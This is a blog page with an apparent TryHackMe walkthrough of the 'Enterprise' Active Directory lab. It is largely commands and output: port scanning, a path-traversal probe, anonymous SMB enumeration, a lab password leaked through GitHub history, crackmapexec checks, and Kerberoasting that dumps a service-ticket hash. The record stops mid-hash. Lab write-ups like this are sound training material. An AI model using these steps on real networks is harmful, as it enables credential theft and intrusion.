@@ -1,0 +1,695 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="World&#39;sEnd">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475# Nmap 7.92SVN scan initiated Tue Jul 12 14:23:34 2022 as:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe Walkthrough - Enterprise">
+<meta property="og:url" content="https://crazyinside.github.io/post/TryHackMe-Enterprise.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475# Nmap 7.92SVN scan initiated Tue Jul 12 14:23:34 2022 as:">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220712153657372.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220712163932959.png">
+<meta property="article:published_time" content="2023-08-13T22:39:09.060Z">
+<meta property="article:modified_time" content="2023-08-11T15:52:06.037Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Active Directory">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220712153657372.png">
+  
+  
+  
+  <title>TryHackMe Walkthrough - Enterprise - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="TryHackMe Walkthrough - Enterprise"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          20k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          165 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">TryHackMe Walkthrough - Enterprise</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.92SVN scan initiated Tue Jul 12 14:23:34 2022 as: nmap -sC -sV -p- -Pn -T4 -oA Enterprise 10.10.251.132</span></span><br><span class="line">Warning: 10.10.251.132 giving up on port because retransmission <span class="built_in">cap</span> hit (6).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.251.132</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 65505 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-07-12 06:43:02Z)</span></span><br><span class="line"><span class="string">135/tcp   open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span></span><br><span class="line"><span class="string">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)</span></span><br><span class="line"><span class="string">445/tcp   open  microsoft-ds?</span></span><br><span class="line"><span class="string">464/tcp   open  kpasswd5?</span></span><br><span class="line"><span class="string">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span></span><br><span class="line"><span class="string">636/tcp   open  tcpwrapped</span></span><br><span class="line"><span class="string">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)</span></span><br><span class="line"><span class="string">3269/tcp  open  tcpwrapped</span></span><br><span class="line"><span class="string">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span></span><br><span class="line"><span class="string">|_ssl-date: 2022-07-12T06:44:07+00:00; +1s from scanner time.</span></span><br><span class="line"><span class="string">| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM</span></span><br><span class="line"><span class="string">| Not valid before: 2022-07-11T06:16:57</span></span><br><span class="line"><span class="string">|_Not valid after:  2023-01-10T06:16:57</span></span><br><span class="line"><span class="string">| rdp-ntlm-info: </span></span><br><span class="line"><span class="string">|   Target_Name: LAB-ENTERPRISE</span></span><br><span class="line"><span class="string">|   NetBIOS_Domain_Name: LAB-ENTERPRISE</span></span><br><span class="line"><span class="string">|   NetBIOS_Computer_Name: LAB-DC</span></span><br><span class="line"><span class="string">|   DNS_Domain_Name: LAB.ENTERPRISE.THM</span></span><br><span class="line"><span class="string">|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM</span></span><br><span class="line"><span class="string">|   DNS_Tree_Name: ENTERPRISE.THM</span></span><br><span class="line"><span class="string">|   Product_Version: 10.0.17763</span></span><br><span class="line"><span class="string">|_  System_Time: 2022-07-12T06:43:55+00:00</span></span><br><span class="line"><span class="string">5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span></span><br><span class="line"><span class="string">|_http-title: Service Unavailable</span></span><br><span class="line"><span class="string">|_http-server-header: Microsoft-HTTPAPI/2.0</span></span><br><span class="line"><span class="string">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span></span><br><span class="line"><span class="string">|_http-server-header: Microsoft-HTTPAPI/2.0</span></span><br><span class="line"><span class="string">|_http-title: Not Found</span></span><br><span class="line"><span class="string">7990/tcp  open  http          Microsoft IIS httpd 10.0</span></span><br><span class="line"><span class="string">| http-methods: </span></span><br><span class="line"><span class="string">|_  Potentially risky methods: TRACE</span></span><br><span class="line"><span class="string">|_http-server-header: Microsoft-IIS/10.0</span></span><br><span class="line"><span class="string">|_http-title: Log in to continue - Log in with Atlassian account</span></span><br><span class="line"><span class="string">9389/tcp  open  mc-nmf        .NET Message Framing</span></span><br><span class="line"><span class="string">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span></span><br><span class="line"><span class="string">|_http-server-header: Microsoft-HTTPAPI/2.0</span></span><br><span class="line"><span class="string">|_http-title: Not Found</span></span><br><span class="line"><span class="string">49664/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49665/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49666/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span></span><br><span class="line"><span class="string">49669/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49670/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49671/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49673/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49677/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49701/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49710/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">49839/tcp open  msrpc         Microsoft Windows RPC</span></span><br><span class="line"><span class="string">Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">| smb2-security-mode: </span></span><br><span class="line"><span class="string">|   311: </span></span><br><span class="line"><span class="string">|_    Message signing enabled and required</span></span><br><span class="line"><span class="string">| smb2-time: </span></span><br><span class="line"><span class="string">|   date: 2022-07-12T06:43:59</span></span><br><span class="line"><span class="string">|_  start_date: N/A</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://google.com/submit/ .</span></span><br><span class="line"><span class="string"># Nmap done at Tue Jul 12 14:44:15 2022 -- 1 IP address (1 host up) scanned in 1241.18 seconds</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="Flag1-txt"><a href="#Flag1-txt" class="headerlink" title="Flag1.txt:"></a>Flag1.txt:</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ENTERPRISE.THM</span><br></pre></td></tr></table></figure>
+
+<p>尝试查看80端口，只有一个很简单的页面：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://enterprise.thm/</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br><span class="line">&lt;h1&gt; Enterprise Domain Controller. Keep out! &lt;/h1&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ dirsearch -u http://enterprise.thm/</span><br><span class="line">Directory /usr/lib/python3/dist-packages/dirsearch is not writable</span><br><span class="line">Directory /usr/lib/python3/dist-packages/dirsearch is not writable</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903</span><br><span class="line"></span><br><span class="line">Output File: /usr/lib/python3/dist-packages/dirsearch/reports/enterprise.thm/-_22-07-12_14-51-31.txt</span><br><span class="line"></span><br><span class="line">Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-22-07-12_14-51-31.<span class="built_in">log</span></span><br><span class="line"></span><br><span class="line">Target: http://enterprise.thm/</span><br><span class="line"></span><br><span class="line">[14:51:32] Starting: </span><br><span class="line">[14:51:35] 403 -  312B  - /%2e%2e//google.com</span><br><span class="line">[14:52:09] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd</span><br><span class="line">[14:53:25] 200 -  110B  - /robots.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://enterprise.thm/robots.txt</span><br><span class="line">Why would robots.txt exist on a Domain Controllers web server?</span><br><span class="line">Robots.txt is <span class="keyword">for</span> search engines, not <span class="keyword">for</span> you</span><br></pre></td></tr></table></figure>
+
+<p>445是被允许匿名访问的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ smbmap -H 10.10.251.132 -u <span class="built_in">whoami</span></span><br><span class="line">[+] Guest session   	IP: 10.10.251.132:445	Name: enterprise.thm                                    </span><br><span class="line">        Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	ADMIN$                                            	NO ACCESS	Remote Admin</span><br><span class="line">	C$                                                	NO ACCESS	Default share</span><br><span class="line">	Docs                                              	READ ONLY	</span><br><span class="line">	IPC$                                              	READ ONLY	Remote IPC</span><br><span class="line">	NETLOGON                                          	NO ACCESS	Logon server share </span><br><span class="line">	SYSVOL                                            	NO ACCESS	Logon server share </span><br><span class="line">	Users                                             	READ ONLY	Users Share. Do Not Touch</span><br></pre></td></tr></table></figure>
+
+<p>送字典的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient //10.10.251.132/Users -U <span class="string">&quot;&quot;</span> -N -c <span class="string">&quot;ls&quot;</span> &gt; <span class="built_in">users</span></span><br><span class="line">$ <span class="built_in">cat</span> <span class="built_in">users</span> </span><br><span class="line">  .                                  DR        0  Fri Mar 12 10:11:49 2021</span><br><span class="line">  ..                                 DR        0  Fri Mar 12 10:11:49 2021</span><br><span class="line">  Administrator                       D        0  Fri Mar 12 05:55:48 2021</span><br><span class="line">  All Users                       DHSrn        0  Sat Sep 15 15:28:48 2018</span><br><span class="line">  atlbitbucket                        D        0  Fri Mar 12 06:53:06 2021</span><br><span class="line">  bitbucket                           D        0  Fri Mar 12 10:11:51 2021</span><br><span class="line">  Default                           DHR        0  Fri Mar 12 08:18:03 2021</span><br><span class="line">  Default User                    DHSrn        0  Sat Sep 15 15:28:48 2018</span><br><span class="line">  desktop.ini                       AHS      174  Sat Sep 15 15:16:48 2018</span><br><span class="line">  LAB-ADMIN                           D        0  Fri Mar 12 08:28:14 2021</span><br><span class="line">  Public                             DR        0  Fri Mar 12 05:27:02 2021</span><br></pre></td></tr></table></figure>
+
+<p>这做字典也不够啊。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">atlbitbucket</span><br><span class="line">bitbucket</span><br><span class="line">LAB-ADMIN</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient //10.10.251.132/Docs -U <span class="string">&quot;&quot;</span></span><br><span class="line">Enter WORKGROUP\<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Try &quot;help&quot; to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; ls</span></span><br><span class="line"><span class="string">  .                                   D        0  Mon Mar 15 10:47:35 2021</span></span><br><span class="line"><span class="string">  ..                                  D        0  Mon Mar 15 10:47:35 2021</span></span><br><span class="line"><span class="string">  RSA-Secured-Credentials.xlsx        A    15360  Mon Mar 15 10:46:54 2021</span></span><br><span class="line"><span class="string">  RSA-Secured-Document-PII.docx       A    18432  Mon Mar 15 10:45:24 2021</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		15587583 blocks of size 4096. 9929074 blocks available</span></span><br><span class="line"><span class="string">smb: \&gt; mget *</span></span><br></pre></td></tr></table></figure>
+
+<p>两个文档都是加密的。跑半天没跑出来。nmap还扫到一个域名，通过7990端口能够正常访问：</p>
+<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220712153657372.png" srcset="/img/loading.gif" lazyload alt="image-20220712153657372"></p>
+<p>在Github中搜寻目标公司，在历史记录里能够看到一个powershell脚本：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> ActiveDirectory</span><br><span class="line"><span class="variable">$userName</span> = <span class="string">&#x27;nik&#x27;</span></span><br><span class="line"><span class="variable">$userPassword</span> = <span class="string">&#x27;ToastyBoi!&#x27;</span></span><br><span class="line"><span class="variable">$psCreds</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="variable">$userPassword</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="variable">$Computers</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> <span class="string">&quot;System.Collections.ArrayList&quot;</span></span><br><span class="line"><span class="variable">$Computer</span> = <span class="variable">$</span>(<span class="built_in">Get-ADComputer</span> <span class="literal">-Filter</span> * | <span class="built_in">Select-Object</span> Name)</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$index</span> = <span class="literal">-1</span>; <span class="variable">$index</span> <span class="operator">-lt</span> <span class="variable">$Computer</span>.count; <span class="variable">$index</span>++) &#123; <span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> <span class="variable">$index</span> &#123;systeminfo&#125; &#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec smb 10.10.251.132 -u nik -p <span class="string">&#x27;ToastyBoi!&#x27;</span></span><br><span class="line">SMB         10.10.251.132   445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.251.132   445    LAB-DC           [+] LAB.ENTERPRISE.THM\nik:ToastyBoi! </span><br></pre></td></tr></table></figure>
+
+<p>但是登录不了winrm：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WINRM       10.10.251.132   5985   LAB-DC           [*] Windows 10.0 Build 17763 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM)</span><br><span class="line">WINRM       10.10.251.132   5985   LAB-DC           [*] http://10.10.251.132:5985/wsman</span><br><span class="line">WINRM       10.10.251.132   5985   LAB-DC           [-] LAB.ENTERPRISE.THM\nik:ToastyBoi!</span><br></pre></td></tr></table></figure>
+
+<p>有一个账号密码可以去申请当前账号能够访问的SPN服务票据，发动Kerberoasting：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">$ GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip 10.10.251.132 <span class="string">&#x27;LAB.ENTERPRISE.THM/nik:ToastyBoi!&#x27;</span></span><br><span class="line">Impacket v0.10.1.dev1+20220704.185348.f2eb2b65 - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation </span><br><span class="line">--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------</span><br><span class="line">HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  2021-03-12 09:20:01.333272  2021-04-26 23:16:41.570158             </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">$ <span class="built_in">cat</span> kerberoastables.txt </span><br><span class="line">$krb5tgs$23$*bitbucket<span class="variable">$LAB</span>.ENTERPRISE.THM<span class="variable">$LAB</span>.ENTERPRISE.THM/bitbucket*$bc046c4c066ff99b622d84378a594dad<span 